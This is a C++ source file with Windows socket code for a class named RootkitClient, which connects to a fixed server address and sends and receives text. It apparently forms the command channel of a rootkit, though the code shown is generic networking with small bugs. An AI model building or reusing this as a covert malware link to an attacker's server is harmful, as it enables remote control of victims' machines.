#include "network_handler.h"
Network::WrapWSA::WrapWSA() {
	WSAData wsaData;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData)) {
		throw std::exception("Error on starting sockets");
	}

}
void Network::WrapWSA::cleanup() {
	std::cout << "WSACleanup called" << std::endl;
	WSACleanup();
}
int Network::WrapWSA::getError() {
	return WSAGetLastError();
}

bool Network::RootkitClient::connect_to_server() {

	sockaddr_in server;
	InetPtonA(AF_INET, Network::SERVER_IP , &(server.sin_addr));
	//server.sin_addr.s_addr = inet_addr(ipaddress.c_str());
	server.sin_family = AF_INET;
	server.sin_port = htons(this->m_port);
	return connect(this->m_server_socket, (const sockaddr*)&server, sizeof(server)) == 0;

}

Network::RootkitClient::RootkitClient() {
	this->m_wsa = Network::WrapWSA();

	this->m_port = Network::SERVER_PORT;

	this->m_server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	std::cout << "checking got socket..." << std::endl;


	if (this->m_server_socket == INVALID_SOCKET)
		throw std::exception("Couldn't open socket");

	std::cout << "trying init" << std::endl;


	bool status = this->connect_to_server();


	if (!status)
		throw std::exception("couldn't listen/bind to port");

	std::cout << "done init" << std::endl;

}

Network::RootkitClient::~RootkitClient() {

	std::cout << "closing socket." << std::endl;

	closesocket(this->m_server_socket);
	this->m_wsa.cleanup();
}


bool Network::RootkitClient::ReceiveText(std::string& text) {

	char recived_buffer[MAX_PACKET_SIZE]{ 0 };

	int bytes_recived = recv(m_server_socket, recived_buffer, MAX_PACKET_SIZE, 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout << this->m_wsa.getError() << std::endl;
		return false;
	}
	std::cout << recived_buffer << std::endl;

	text += recived_buffer;

	return text.size();
}


bool Network::RootkitClient::SendText(std::string text) {

	int bytes_recived = send(m_server_socket, text.c_str(), text.size(), 0);

	if (bytes_recived == SOCKET_ERROR) {
		std::cout << "SOCKET ERROR! errorcode:";
		std::cout << this->m_wsa.getError() << std::endl;
		return false;
	}

	return true;
}

